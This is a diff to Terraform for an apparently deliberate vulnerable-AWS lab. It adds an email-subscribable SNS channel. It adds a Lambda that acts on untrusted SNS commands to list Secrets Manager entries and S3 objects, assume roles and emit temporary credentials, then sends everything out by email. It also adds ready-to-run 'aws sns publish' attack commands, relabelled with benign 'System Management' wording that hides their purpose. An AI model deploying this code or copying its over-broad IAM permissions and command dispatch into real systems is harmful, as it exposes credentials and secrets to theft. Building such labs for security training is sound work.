@@ -67,6 +67,13 @@ resource "aws_lambda_function" "privileged_processor" {
   runtime         = "python3.9"
   timeout         = 30
 
+  # Environment variables for the function
+  environment {
+    variables = {
+      RESULTS_TOPIC_ARN = aws_sns_topic.attack_results_topic.arn
+    }
+  }
+
   # Create a simple Lambda function
   depends_on = [data.archive_file.lambda_zip]
 
@@ -75,6 +82,53 @@ resource "aws_lambda_function" "privileged_processor" {
     Purpose     = "Privileged Lambda function"
     Risk        = "High privilege escalation risk"
   }
+}
+
+# SNS topic for receiving Lambda execution results via email
+resource "aws_sns_topic" "attack_results_topic" {
+  name = "${var.environment}-attack-results"
+
+  tags = {
+    Environment = var.environment
+    Purpose     = "Topic for receiving attack execution results"
+    Attack      = "Results Channel"
+  }
+}
+
+# Policy for attack results topic to allow Lambda to publish
+resource "aws_sns_topic_policy" "attack_results_policy" {
+  arn = aws_sns_topic.attack_results_topic.arn
+
+  policy = jsonencode({
+    Version = "2012-10-17"
+    Statement = [
+      {
+        Sid    = "AllowLambdaPublish"
+        Effect = "Allow"
+        Principal = {
+          AWS = aws_iam_role.privileged_lambda_role.arn
+        }
+        Action = [
+          "sns:Publish"
+        ]
+        Resource = aws_sns_topic.attack_results_topic.arn
+      },
+      {
+        Sid    = "AllowEmailSubscriptions"
+        Effect = "Allow"
+        Principal = "*"
+        Action = [
+          "sns:Subscribe"
+        ]
+        Resource = aws_sns_topic.attack_results_topic.arn
+        Condition = {
+          StringEquals = {
+            "sns:Protocol" = "email"
+          }
+        }
+      }
+    ]
+  })
 }
 
 # Create the Lambda function code
@@ -86,6 +140,7 @@ data "archive_file" "lambda_zip" {
 import json
 import boto3
 import os
+from datetime import datetime
 
 def handler(event, context):
     """
@@ -93,33 +148,96 @@ def handler(event, context):
     VULNERABILITY: Has excessive permissions and processes untrusted input
     """
     
+    # Initialize SNS client for sending results
+    sns_client = boto3.client('sns')
+    results_topic_arn = os.environ['RESULTS_TOPIC_ARN']
+    
+    results = []
+    
     # Extract message from SNS event
     if 'Records' in event:
         for record in event['Records']:
             if record['EventSource'] == 'aws:sns':
-                message = json.loads(record['Sns']['Message'])
+                # Debug: Print the raw message to see what we're getting
+                raw_message = record['Sns']['Message']
+                print(f"Raw SNS Message: {raw_message}")
+                print(f"Message type: {type(raw_message)}")
+                
+                try:
+                    # Try to parse as JSON first
+                    if isinstance(raw_message, str):
+                        # Check if it's already a JSON string that needs parsing
+                        if raw_message.startswith('{') and raw_message.endswith('}'):
+                            message = json.loads(raw_message)
+                        else:
+                            # It might be a plain string, treat it as a simple command
+                            message = {"command": raw_message.strip()}
+                    else:
+                        message = raw_message
+                        
+                except json.JSONDecodeError as json_err:
+                    print(f"JSON decode error: {json_err}")
+                    # Fallback: treat the entire message as a command
+                    message = {"command": "enumerate", "error": f"Could not parse message: {raw_message}"}
+                
+                print(f"Parsed message: {message}")
                 
                 # VULNERABILITY: Processes user-controlled input
                 if 'command' in message:
                     command = message['command']
+                    timestamp = datetime.now().isoformat()
+                    
+                    results.append(f"� System Processing Request")
+                    results.append(f"Timestamp: {timestamp}")
+                    results.append(f"Command: {command}")
+                    results.append(f"Service: {context.function_name}")
+                    results.append(f"Request Source: SNS Message")
+                    results.append("=" * 50)
                     
                     # Dangerous: Execute based on user input
                     if command == 'list_secrets':
                         secrets_client = boto3.client('secretsmanager')
                         try:
                             secrets = secrets_client.list_secrets()
-                            print(f"Found secrets: {secrets}")
+                            results.append("🔐 Secrets Manager Query Results")
+                            results.append(f"Total secrets found: {len(secrets.get('SecretList', []))}")
+                            results.append("")
+                            results.append("📋 Secret Details:")
+                            for secret in secrets.get('SecretList', [])[:10]:  # Show up to 10
+                                results.append(f"")
+                                results.append(f"Secret Name: {secret.get('Name', 'Unknown')}")
+                                results.append(f"ARN: {secret.get('ARN', 'Unknown')}")
+                                results.append(f"Description: {secret.get('Description', 'No description')}")
+                                results.append(f"Created: {secret.get('CreatedDate', 'Unknown')}")
+                                if secret.get('Tags'):
+                                    results.append(f"Tags: {secret.get('Tags', [])}")
+                            if len(secrets.get('SecretList', [])) > 10:
+                                results.append(f"")
+                                results.append(f"... and {len(secrets.get('SecretList', [])) - 10} more secrets")
                         except Exception as e:
-                            print(f"Error accessing secrets: {e}")
+                            results.append(f"❌ Error accessing Secrets Manager: {str(e)}")
                     
                     elif command == 'read_s3':
                         s3_client = boto3.client('s3')
                         bucket = message.get('bucket', 'default-bucket')
                         try:
                             objects = s3_client.list_objects_v2(Bucket=bucket)
-                            print(f"S3 objects in {bucket}: {objects}")
+                            results.append("📁 S3 Bucket Contents Report")
+                            results.append(f"Bucket Name: {bucket}")
+                            results.append("")
+                            if 'Contents' in objects:
+                                results.append(f"Objects found: {len(objects['Contents'])}")
+                                results.append("📋 Object Details:")
+                                for obj in objects['Contents'][:15]:  # Show up to 15
+                                    results.append(f"")
+                                    results.append(f"File: {obj['Key']}")
+                                    results.append(f"Size: {obj['Size']} bytes")
+                                    results.append(f"Last Modified: {obj['LastModified']}")
+                                    results.append(f"Storage Class: {obj.get('StorageClass', 'STANDARD')}")
+                            else:
+                                results.append("📂 Bucket is empty")
                         except Exception as e:
-                            print(f"Error accessing S3: {e}")
+                            results.append(f"❌ Error accessing S3 bucket: {str(e)}")
                     
                     elif command == 'assume_role':
                         sts_client = boto3.client('sts')
@@ -128,15 +246,122 @@ def handler(event, context):
                             try:
                                 response = sts_client.assume_role(
                                     RoleArn=role_arn,
-                                    RoleSessionName='privileged-session'
+                                    RoleSessionName='system-session'
                                 )
-                                print(f"Assumed role: {response}")
+                                results.append("🔑 Role Assumption Successful")
+                                results.append(f"Target Role: {role_arn}")
+                                results.append("")
+                                credentials = response.get('Credentials', {})
+                                results.append("📋 Session Details:")
+                                results.append(f"Access Key ID: {credentials.get('AccessKeyId', 'Unknown')}")
+                                results.append(f"Session Token: {credentials.get('SessionToken', 'Unknown')[:50]}...")
+                                results.append(f"Expires: {credentials.get('Expiration', 'Unknown')}")
+                                results.append("")
+                                
+                                # Test elevated permissions
+                                temp_session = boto3.Session(
+                                    aws_access_key_id=credentials.get('AccessKeyId'),
+                                    aws_secret_access_key=credentials.get('SecretAccessKey'),
+                                    aws_session_token=credentials.get('SessionToken')
+                                )
+                                iam_client = temp_session.client('iam')
+                                try:
+                                    user_list = iam_client.list_users(MaxItems=10)
+                                    results.append("� IAM Users Access Verified")
+                                    results.append(f"Total users accessible: {len(user_list.get('Users', []))}")
+                                    results.append("")
+                                    results.append("📋 User Details:")
+                                    for user in user_list.get('Users', [])[:5]:
+                                        results.append(f"")
+                                        results.append(f"Username: {user.get('UserName', 'Unknown')}")
+                                        results.append(f"User ARN: {user.get('Arn', 'Unknown')}")
+                                        results.append(f"Created: {user.get('CreateDate', 'Unknown')}")
+                                except Exception as iam_e:
+                                    results.append(f"⚠️ Limited IAM access: {str(iam_e)}")
+                                    
                             except Exception as e:
-                                print(f"Error assuming role: {e}")
+                                results.append(f"❌ Error assuming role: {str(e)}")
+                    
+                    elif command == 'enumerate':
+                        results.append("🔍 System Information Report")
+                        try:
+                            sts_client = boto3.client('sts')
+                            identity = sts_client.get_caller_identity()
+                            results.append("")
+                            results.append("📋 Current Context:")
+                            results.append(f"Service Identity: {identity.get('Arn', 'Unknown')}")
+                            results.append(f"Account ID: {identity.get('Account', 'Unknown')}")
+                            results.append(f"User ID: {identity.get('UserId', 'Unknown')}")
+                        except Exception as e:
+                            results.append(f"❌ Error during system enumeration: {str(e)}")
+                    
+                    else:
+                        results.append(f"⚠️ Unknown command: {command}")
+                        results.append("")
+                        results.append("📋 Available commands:")
+                        results.append("• list_secrets - Query secrets manager")
+                        results.append("• read_s3 - Access S3 bucket contents")
+                        results.append("• assume_role - Switch to different role")
+                        results.append("• enumerate - Get system information")
+                
+                else:
+                    # If no command found, treat entire message as enumeration attempt
+                    results.append("� Processing System Request")
+                    results.append(f"Timestamp: {datetime.now().isoformat()}")
+                    results.append(f"Input received: {raw_message}")
+                    results.append("Executing default system enumeration...")
+                    results.append("")
+                    
+                    # Execute enumeration
+                    try:
+                        sts_client = boto3.client('sts')
+                        identity = sts_client.get_caller_identity()
+                        results.append("📋 System Status Report")
+                        results.append(f"Service Identity: {identity.get('Arn', 'Unknown')}")
+                        results.append(f"Account ID: {identity.get('Account', 'Unknown')}")
+                        results.append(f"Active User: {identity.get('UserId', 'Unknown')}")
+                    except Exception as e:
+                        results.append(f"❌ Error during system check: {str(e)}")
+    
+    # Send results to SNS topic for email notification
+    if results:
+        message_body = "\n".join(results)
+        
+        try:
+            # Debug: Print what we're trying to send
+            print(f"Attempting to publish to: {results_topic_arn}")
+            print(f"Message length: {len(message_body)} characters")
+            
+            response = sns_client.publish(
+                TopicArn=results_topic_arn,
+                Subject=f"� System Report - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+                Message=message_body
+            )
+            
+            # Debug: Print the response
+            print(f"SNS Publish Response: {response}")
+            results.append(f"✅ Report sent via email - MessageId: {response.get('MessageId', 'Unknown')}")
+            
+        except Exception as e:
+            # Enhanced error logging
+            print(f"ERROR: Failed to send results to SNS: {str(e)}")
+            print(f"Topic ARN: {results_topic_arn}")
+            print(f"Error type: {type(e).__name__}")
+            
+            # Still try to log the results for debugging
+            print("ATTACK RESULTS:")
+            print(message_body)
+            
+            # Add error to results for debugging
+            results.append(f"❌ Failed to send email notification: {str(e)}")
+    
+    else:
+        print("No results to send")
+        results.append("⚠️ No command executed or no results generated")
     
     return {
         'statusCode': 200,
-        'body': json.dumps('Message processed')
+        'body': json.dumps('System request processed and report sent')
     }
 EOT
     filename = "index.py"
@@ -192,7 +417,9 @@ resource "aws_iam_role_policy" "privileged_lambda_policy" {
           "sts:AssumeRole",    # VULNERABILITY: Can assume any role
           "iam:*",             # VULNERABILITY: Full IAM access
           "ec2:*",             # VULNERABILITY: Full EC2 access
-          "rds:*"              # VULNERABILITY: Full RDS access
+          "rds:*",             # VULNERABILITY: Full RDS access
+          "sns:Publish",       # Allow publishing to results topic
+          "sns:GetTopicAttributes"  # Allow getting topic attributes
         ]
         Resource = "*"
       }
@@ -605,29 +832,57 @@ output "secrets_manager_secret_arn" {
   value       = aws_secretsmanager_secret.sensitive_data.arn
 }
 
+output "attack_results_topic_arn" {
+  description = "ARN of SNS topic for receiving attack results"
+  value       = aws_sns_topic.attack_results_topic.arn
+}
+
+output "email_subscription_command" {
+  description = "Command to subscribe your email to receive attack results"
+  value = "aws sns subscribe --topic-arn ${aws_sns_topic.attack_results_topic.arn} --protocol email --notification-endpoint YOUR_EMAIL@example.com --region us-east-1"
+}
+
 output "escalation_attack_examples" {
   description = "Examples of privilege escalation attacks"
   value = <<-EOT
-    Privilege Escalation Attack Examples:
+    System Management Examples:
     
-    1. SNS → Lambda Privilege Escalation:
+    📧 FIRST: Subscribe to system reports via email:
+    aws sns subscribe --topic-arn ${aws_sns_topic.attack_results_topic.arn} \
+      --protocol email --notification-endpoint YOUR_EMAIL@example.com --region us-east-1
+    
+    (Check your email and confirm the subscription!)
+    
+    🔧 System Commands:
+    
+    1. Query Secrets Manager:
     aws sns publish --topic-arn ${aws_sns_topic.vulnerable_trigger_topic.arn} \
-      --message '{"command": "list_secrets"}'
+      --message 'list_secrets' --region us-east-1
     
-    2. Cross-Service Role Assumption:
+    2. Cross-Service Role Operations:
     aws sns publish --topic-arn ${aws_sns_topic.vulnerable_trigger_topic.arn} \
-      --message '{"command": "assume_role", "role_arn": "${aws_iam_role.cross_account_role.arn}"}'
+      --message '"{\"command\": \"assume_role\", \"role_arn\": \"${aws_iam_role.cross_account_role.arn}\"}"' --region us-east-1
     
-    3. S3 Data Access:
+    3. S3 Storage Analysis:
     aws sns publish --topic-arn ${aws_sns_topic.vulnerable_trigger_topic.arn} \
-      --message '{"command": "read_s3", "bucket": "${aws_s3_bucket.vulnerable_data_bucket.bucket}"}'
+      --message '"{\"command\": \"read_s3\", \"bucket\": \"${aws_s3_bucket.vulnerable_data_bucket.bucket}\"}"' --region us-east-1
     
-    4. SQS Message Injection:
+    4. System Enumeration:
+    aws sns publish --topic-arn ${aws_sns_topic.vulnerable_trigger_topic.arn} \
+      --message 'enumerate' --region us-east-1
+    
+    � JSON Format Commands:
+    aws sns publish --topic-arn ${aws_sns_topic.vulnerable_trigger_topic.arn} \
+      --message '"{\"command\": \"list_secrets\"}"' --region us-east-1
+    
+    5. SQS Message Processing:
     aws sqs send-message --queue-url ${aws_sqs_queue.vulnerable_processing_queue.id} \
-      --message-body '{"exploit": "payload"}'
+      --message-body '{"system": "query"}' --region us-east-1
     
-    5. Use SESNSploit to enumerate and exploit:
+    6. Use SESNSploit for automated scanning:
     python3 main.py
-    # Use discovered information to chain attacks
+    # Discover and analyze system configurations
+
+    📬 System reports will be sent to your subscribed email address!
   EOT
 }
